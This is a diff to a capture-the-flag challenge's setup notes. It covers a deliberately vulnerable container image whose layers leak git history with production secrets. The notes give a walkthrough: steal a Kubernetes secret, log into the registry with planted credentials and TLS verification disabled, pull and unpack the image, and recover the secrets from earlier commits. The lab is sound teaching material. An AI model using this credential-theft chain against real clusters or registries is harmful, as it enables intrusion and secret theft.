@@ -8,7 +8,7 @@ All components for Attack #2 are now in place and tested.
 
 #### 1. Vulnerable Docker Image
 - **Location**: `challenges/victim-repo-sample/Dockerfile` (recipe-api application)
-- **Image**: `localhost:30000/recipe-api:v1.0`
+- **Image**: `registry.sc.local:30443/recipe-api:v1.0`
 - **Vulnerability**: Single-stage build with `.git` copied and then "deleted"
 - **Key Layers**:
   - Layer `e83a405bc...`: Contains `app/.git/` with full commit history
@@ -17,7 +17,7 @@ All components for Attack #2 are now in place and tested.
 #### 2. Git Repository with Secrets
 - **Commits**:
   - `26e05de` - Initial commit: Recipe API v1.0 (contains `.env.production` with secrets)
-    - **Registry credentials**: `ctf-admin` / `CTFRegistryPass123!`
+    - **Registry credentials**: `sc-admin` / `RegistryPass123!`
     - **ArgoCD production deployment credentials** (server, auth token, app name, namespace)
     - **FLAG**: `FLAG{l4y3r_l34k_g1t_h1st0ry:NEXT:g1t0ps_c0mpr0m1s3}`
   - `ed9f32e` - Security fix: Remove accidentally committed production secrets
@@ -25,11 +25,11 @@ All components for Attack #2 are now in place and tested.
 #### 3. Updated Attack #1 Flag
 - **Old**: `FLAG{t3kt0n_pwn_r3qu3st_1s_d4ng3r0us}`
 - **New**: `FLAG{t3kt0n_pwn_r3qu3st_1s_d4ng3r0us:NEXT:registry_layer_leak}`
-- **Secret `ctf-flag` in namespace `ctf-challenge` now includes**:
+- **Secret `registry-credentials` in namespace `ci` now includes**:
   - `flag`: Updated with registry hint
-  - `registry-url`: `https://localhost:30000`
-  - `registry-user`: `ctf-admin`
-  - `registry-password`: `CTFRegistryPass123!`
+  - `registry-url`: `https://registry.sc.local:30443`
+  - `registry-user`: `sc-admin`
+  - `registry-password`: `RegistryPass123!`
   - `next-target`: `recipe-api:v1.0`
 
 #### 4. Documentation
@@ -43,11 +43,11 @@ All components for Attack #2 are now in place and tested.
 ```
 Attack #1 (Tekton PWN)
          ↓
-   Steal ctf-flag secret
+   Steal registry-credentials secret
          ↓
    Extract registry credentials
          ↓
-   Login to registry @ localhost:30000
+   Login to registry @ registry.sc.local:30443
          ↓
    Discover recipe-api:v1.0
          ↓
@@ -80,16 +80,16 @@ cd challenges/challenge2
 
 ```bash
 # 1. Get credentials from Attack #1
-kubectl get secret ctf-flag -n ctf-challenge -o json | jq -r '.data | map_values(@base64d)'
+kubectl get secret registry-credentials -n ci -o json | jq -r '.data | map_values(@base64d)'
 
 # 2. Login to registry
-podman login localhost:30000 --tls-verify=false -u ctf-admin -p CTFRegistryPass123!
+podman login registry.sc.local:30443 --tls-verify=false -u sc-admin -p RegistryPass123!
 
 # 3. Pull image
-podman pull localhost:30000/recipe-api:v1.0 --tls-verify=false
+podman pull registry.sc.local:30443/recipe-api:v1.0 --tls-verify=false
 
 # 4. Save and extract
-podman save localhost:30000/recipe-api:v1.0 -o /tmp/recipe.tar
+podman save registry.sc.local:30443/recipe-api:v1.0 -o /tmp/recipe.tar
 mkdir /tmp/extract && tar -xf /tmp/recipe.tar -C /tmp/extract
 
 # 5. Find .git layer
@@ -123,10 +123,10 @@ challenges/victim-repo-sample/
 └── test-attack2.sh                    # NEW - Verification script
 
 Container Registry:
-├── localhost:30000/recipe-api:v1.0    # NEW - Pushed vulnerable image
+├── registry.sc.local:30443/recipe-api:v1.0    # NEW - Pushed vulnerable image
 
 Kubernetes Secrets:
-└── ctf-flag (namespace: ctf-challenge)# MODIFIED - Added registry credentials
+└── registry-credentials (namespace: ci)# MODIFIED - Added registry credentials
 ```
 
 ### Security Lessons Taught
@@ -173,8 +173,8 @@ The flag hints at: `g1t0ps_c0mpr0m1s3`
 **Image not in registry?**
 ```bash
 cd challenges/victim-repo-sample
-podman build -t localhost:30000/recipe-api:v1.0 .
-podman push localhost:30000/recipe-api:v1.0 --tls-verify=false
+podman build -t registry.sc.local:30443/recipe-api:v1.0 .
+podman push registry.sc.local:30443/recipe-api:v1.0 --tls-verify=false
 ```
 
 **.git not in layers?**
@@ -183,8 +183,8 @@ podman push localhost:30000/recipe-api:v1.0 --tls-verify=false
 ls -la .git/
 
 # Rebuild with no cache
-podman build --no-cache -t localhost:30000/recipe-api:v1.0 .
-podman push localhost:30000/recipe-api:v1.0 --tls-verify=false
+podman build --no-cache -t registry.sc.local:30443/recipe-api:v1.0 .
+podman push registry.sc.local:30443/recipe-api:v1.0 --tls-verify=false
 ```
 
 **Can't find flag in git history?**
@@ -194,7 +194,7 @@ git log --all --oneline
 git show cb0d66f:.env.production
 ```
 
-### CTF Organizer Notes
+### Organizer Notes
 
 **Difficulty**: Medium
 **Estimated Time**: 30-60 minutes
